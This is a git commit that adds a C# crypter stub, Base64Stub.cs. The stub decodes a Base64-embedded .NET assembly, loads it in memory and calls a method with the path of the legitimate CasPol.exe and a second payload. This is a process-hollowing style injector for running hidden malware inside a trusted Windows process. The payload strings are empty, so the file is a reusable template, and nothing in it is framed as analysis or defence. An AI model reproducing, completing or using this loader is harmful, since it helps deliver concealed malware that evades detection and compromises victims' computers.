25c5568c11326e4f7acd2c743a8fbfc83bc22f40
Intrus1ve <98790607+Intrus1ve@users.noreply.github.com>
2022-12-23 00:57:22 +0300

    Add files via upload

---
+++ Base64Stub.cs
@@ -0,0 +1,52 @@
+using System;
+using System.Net;
+using System.Reflection;
+using System.Text;
+
+
+
+namespace Runpereversed
+{
+
+	internal static partial class Program
+	{
+
+		[STAThread]
+		private static void Main()
+		{
+
+			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+
+		
+
+			byte[] ByrawAssembly = Convert.FromBase64String("");
+
+
+
+			byte[] array6 = Convert.FromBase64String("");
+
+
+		
+			object obj = new object[]
+			{
+				"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe",
+				string.Empty,
+				array6,
+				true
+			};
+			string target = null;
+			Assembly assembly = Assembly.Load(ByrawAssembly);
+			assembly.GetType("Vxshellew31.Rayzroot").InvokeMember("enemy31cu", BindingFlags.InvokeMethod, null, target, (object[])obj);
+			
+
+
+
+
+
+
+		}
+
+
+	}
+}
